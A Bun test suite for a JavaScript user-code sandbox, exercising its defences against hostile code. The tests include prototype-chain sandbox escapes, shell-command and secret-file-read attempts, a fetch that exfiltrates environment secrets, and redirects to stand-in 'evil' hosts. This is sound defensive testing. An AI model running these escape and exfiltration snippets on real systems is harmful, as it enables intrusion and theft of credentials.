/**
 * User-code sandbox: HOSTILE tests
 * ============================================================================
 *
 * Each case is something a malicious action's code (or one written by a deceived
 * agent) would try. Against the earlier sandbox (a Bun child process with
 * `new Function`) almost all of them failed: the code was host JavaScript. See
 * docs/agents/sandbox.md.
 *
 * The effects are checked OUTSIDE the sandbox (a file that must not be created,
 * a server that must not receive anything), not only with what the code returns.
 */

import { existsSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { createServer, type Server } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { afterAll, beforeAll, describe, expect, setDefaultTimeout, test } from "bun:test";

import { executeSandbox, type SandboxInput } from "../lib/worker-sandbox";

// Each test launches one or several processes: with a loaded machine 5 s is not enough.
setDefaultTimeout(60_000);

const base: SandboxInput = {
  code: "",
  payload: { hello: "world" },
  envVars: {},
  timeoutMs: 3000,
  memoryLimitMb: 32,
};
const runOnce = (code: string, extra: Partial<SandboxInput> = {}) =>
  executeSandbox({ ...base, ...extra, code });

const SECRET = `secret-${Math.random().toString(36).slice(2)}`;
let dir = "";
let secretFile = "";
let mark = "";

// A local TCP/HTTP server: if it receives anything, the code reached the network.
let server: Server;
let port = 0;
const receivedItems: string[] = [];

beforeAll(async () => {
  dir = mkdtempSync(join(tmpdir(), "kh1-sandbox-"));
  secretFile = join(dir, "secret.env");
  writeFileSync(secretFile, `DATABASE_ADMIN_URL=postgres://root:${SECRET}@db/prod\n`);
  mark = join(dir, "pwned.txt");
  process.env.KH1_PARENT_SECRET = SECRET;

  // It counts CONNECTIONS (not data): it is enough for the code to manage to connect.
  server = createServer((s) => {
    receivedItems.push("connection");
    s.once("data", (d) => {
      const redirects = String(d).startsWith("GET /redir");
      s.end(
        redirects
          ? "HTTP/1.1 302 Found\r\nLocation: http://evil.invalid/stolen\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
          : "HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok"
      );
    });
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()));
  port = (server.address() as { port: number }).port;
});

afterAll(() => {
  delete process.env.KH1_PARENT_SECRET;
  server?.close();
  rmSync(dir, { recursive: true, force: true });
});

describe("sandbox: the normal stuff keeps working", () => {
  test("result, event, declared env and console", async () => {
    const r = await runOnce(
      "console.log('x', {a:1}); return { echo: event.hello, n: 1 + 1, env };",
      {
        envVars: { DECLARED: "yes" },
      }
    );
    expect(r.error).toBeNull();
    expect(r.result).toEqual({ echo: "world", n: 2, env: { DECLARED: "yes" } });
    expect(r.logs).toContain('[LOG] x {"a":1}');
  });
});

describe("sandbox: environment and host objects", () => {
  test("there is no `process` (or its env) inside the code", async () => {
    const r = await runOnce(
      "const p = globalThis.process; if (!p) return 'no-process'; return JSON.stringify(p.env);"
    );
    expect(r.result).toBe("no-process");
    expect(JSON.stringify(r)).not.toContain(SECRET);
  });

  test("escape through the prototype chain: Function's constructor does not give the host", async () => {
    const r = await runOnce(`
      const g1 = ({}).constructor.constructor("return this")();
      const g2 = kitsuden.fetch.constructor("return globalThis")();
      const g3 = (async () => {}).constructor("return this")();
      return [g1, g2, await g3].map((g) => [typeof g.process, typeof g.require, typeof g.Bun, typeof g.Deno]);
    `);
    expect(r.error).toBeNull();
    expect(r.result).toEqual([
      ["undefined", "undefined", "undefined", "undefined"],
      ["undefined", "undefined", "undefined", "undefined"],
      ["undefined", "undefined", "undefined", "undefined"],
    ]);
  });
});

describe("sandbox: system modules", () => {
  for (const mod of [
    "node:child_process",
    "child_process",
    "node:fs",
    "fs",
    "node:net",
    "pg",
    "bun",
  ]) {
    test(`import("${mod}") loads nothing`, async () => {
      const r = await runOnce(
        `const m = await import(${JSON.stringify(mod)}); return Object.keys(m).length;`
      );
      expect(r.success).toBe(false);
      expect(r.result).toBeNull();
    });
  }

  test("require does not exist", async () => {
    const r = await runOnce("return typeof require + ' ' + typeof module + ' ' + typeof Bun;");
    expect(r.result).toBe("undefined undefined undefined");
  });

  test("launching a command leaves no trace on disk", async () => {
    const order = JSON.stringify(`echo pwned > "${mark}"`);
    await runOnce(`
      try { (await import("node:child_process")).execSync(${order}); } catch (e) {}
      try { globalThis.Bun.spawnSync(["sh", "-c", ${order}]); } catch (e) {}
      try { require("child_process").execSync(${order}); } catch (e) {}
      return 1;
    `);
    expect(existsSync(mark)).toBe(false);
  });

  test("reading a server file (e.g. apps/api/.env) is not possible", async () => {
    const route = JSON.stringify(secretFile);
    const r = await runOnce(`
      const attempts = [];
      try { attempts.push((await import("node:fs")).readFileSync(${route}, "utf8")); } catch (e) {}
      try { attempts.push(await globalThis.Bun.file(${route}).text()); } catch (e) {}
      try { attempts.push(await (await fetch("file://" + ${route})).text()); } catch (e) {}
      return attempts;
    `);
    expect(JSON.stringify(r)).not.toContain(SECRET);
    expect(r.result ?? []).toEqual([]);
  });
});

describe("sandbox: red", () => {
  test("fetch to a host that is not in the list: rejected and the server receives nothing", async () => {
    const before = receivedItems.length;
    const r = await runOnce(
      `const r = await fetch("http://127.0.0.1:${port}/exfiltrate?d=" + JSON.stringify(env)); return r.status;`,
      { envVars: { TOKEN: SECRET }, fetchAllow: ["api.example.com"] }
    );
    expect(r.success).toBe(false);
    expect(r.error).toContain("Host not allowed");
    expect(receivedItems.length).toBe(before);
  });

  test("direct sockets (node:net) do not exist", async () => {
    const before = receivedItems.length;
    await runOnce(`
      try { const net = await import("node:net"); net.connect(${port}, "127.0.0.1").write("x"); } catch (e) {}
      try { await globalThis.Bun.connect({ hostname: "127.0.0.1", port: ${port}, socket: { data() {} } }); } catch (e) {}
      return 1;
    `);
    await new Promise((r) => setTimeout(r, 200));
    expect(receivedItems.length).toBe(before);
  });

  /** The server of these tests is on loopback: that needs the opt-in. */
  async function withInternalFetch<T>(fn: () => Promise<T>): Promise<T> {
    process.env.KITSUDEN_SANDBOX_ALLOW_INTERNAL_FETCH = "true";
    try {
      return await fn();
    } finally {
      delete process.env.KITSUDEN_SANDBOX_ALLOW_INTERNAL_FETCH;
    }
  }

  test("an allowed host on a private address is refused, and the server receives nothing", async () => {
    const before = receivedItems.length;
    const r = await runOnce(`return (await fetch("http://127.0.0.1:${port}/ok")).status;`, {
      fetchAllow: ["127.0.0.1"],
    });
    expect(r.success).toBe(false);
    expect(r.error).toContain("non-public");
    expect(receivedItems.length).toBe(before);
  });

  test("a redirect to another host is not followed (the 302 is returned)", async () => {
    const r = await withInternalFetch(() =>
      runOnce(
        `const r = await fetch("http://127.0.0.1:${port}/redir"); return [r.status, r.headers.location];`,
        {
          fetchAllow: ["127.0.0.1"],
        }
      )
    );
    expect(r.result).toEqual([302, "http://evil.invalid/stolen"]);
  });

  test("control: with the host in the list, the call DOES go out", async () => {
    const before = receivedItems.length;
    const r = await withInternalFetch(() =>
      runOnce(
        `const r = await fetch("http://127.0.0.1:${port}/ok"); return [r.status, await r.text()];`,
        {
          fetchAllow: ["127.0.0.1"],
        }
      )
    );
    expect(r.result).toEqual([200, "ok"]);
    expect(receivedItems.length).toBe(before + 1);
  });

  test("non-http(s) protocols and credentials in the URL: rejected", async () => {
    for (const url of [
      `file://${secretFile}`,
      "ftp://127.0.0.1/",
      `http://u:p@127.0.0.1:${port}/`,
    ]) {
      const r = await runOnce(`return (await fetch(${JSON.stringify(url)})).status;`, {
        fetchAllow: ["127.0.0.1"],
      });
      expect(r.success).toBe(false);
    }
  });
});

describe("sandbox: the database only through the injected API", () => {
  test("with the credentials in hand, the code cannot open the database", async () => {
    const url = process.env.DATABASE_URL ?? "postgres://kitsuden:x@127.0.0.1:5434/kitsuden_test";
    const r = await runOnce(
      `
      const output = [];
      try { const pg = await import("pg"); const c = new pg.default.Client(env.URL); await c.connect(); output.push((await c.query("select current_user")).rows); } catch (e) {}
      try { output.push(await globalThis.Bun.sql\`select 1\`); } catch (e) {}
      try { const sql = new globalThis.Bun.SQL(env.URL); output.push(await sql\`select 1\`); } catch (e) {}
      return output;
    `,
      { envVars: { URL: url } }
    );
    expect(r.result).toEqual([]);
  });

  test("without identity, `kitsuden.api` answers nothing", async () => {
    const r = await runOnce("return (await kitsuden.api.get('/api/data-sets')).status;");
    expect(r.success).toBe(false);
    expect(r.error).toContain("no Kitsuden API identity");
  });

  test("the injected API does not allow calling actions, functions or auth, or odd paths", async () => {
    const seen: string[] = [];
    const api = async (m: string, c: string) => {
      seen.push(`${m} ${c}`);
      return { status: 200, headers: {}, body: "{}" };
    };
    for (const path of [
      "/api/actions/x/execute",
      "/api/functions",
      "/api/auth/sign-in/email",
      "http://evil.test/api/x",
      "/api/../internal",
      "//evil.test/api",
      "/api/data-sets\\..\\x",
    ]) {
      const r = await runOnce(
        `return (await kitsuden.api.post(${JSON.stringify(path)}, {})).status;`,
        { api }
      );
      expect(r.success).toBe(false);
    }
    expect(seen).toEqual([]);
    const ok = await runOnce("return (await kitsuden.api.get('/api/data-sets?limit=1')).status;", {
      api,
    });
    expect(ok.result).toBe(200);
    expect(seen).toEqual(["GET /api/data-sets?limit=1"]);
  });
});

describe("sandbox: CPU, memory and host abuse", () => {
  test("an infinite loop is cut off by time", async () => {
    const t = Date.now();
    const r = await runOnce("while (true) {}", { timeoutMs: 800 });
    expect(r.exitReason).toBe("timeout");
    expect(Date.now() - t).toBeLessThan(6000);
  });

  test("unbounded memory: the interpreter runs out of memory, the API does not", async () => {
    const t = Date.now();
    const rss = process.memoryUsage().rss;
    const r = await runOnce("const a = []; let i = 0; for (;;) a.push(new Array(1e5).fill(i++));", {
      memoryLimitMb: 16,
      timeoutMs: 10_000,
    });
    expect(r.success).toBe(false);
    expect(r.error).toMatch(/out of memory/i);
    expect(Date.now() - t).toBeLessThan(8000);
    // The child process eats the memory, not this one.
    expect(process.memoryUsage().rss - rss).toBeLessThan(200 * 1024 * 1024);
  });

  test("too many host calls: they are cut off", async () => {
    const api = async () => ({ status: 200, headers: {}, body: "{}" });
    const r = await runOnce(
      "let ok = 0; for (let i = 0; i < 20; i++) { try { await kitsuden.api.get('/api/x'); ok++; } catch (e) {} } return ok;",
      { api, maxCalls: 5 }
    );
    expect(r.result).toBe(5);
  });

  test("a giant result is not accepted", async () => {
    const r = await runOnce("return 'x'.repeat(3_000_000);", { memoryLimitMb: 64 });
    expect(r.success).toBe(false);
  });
});
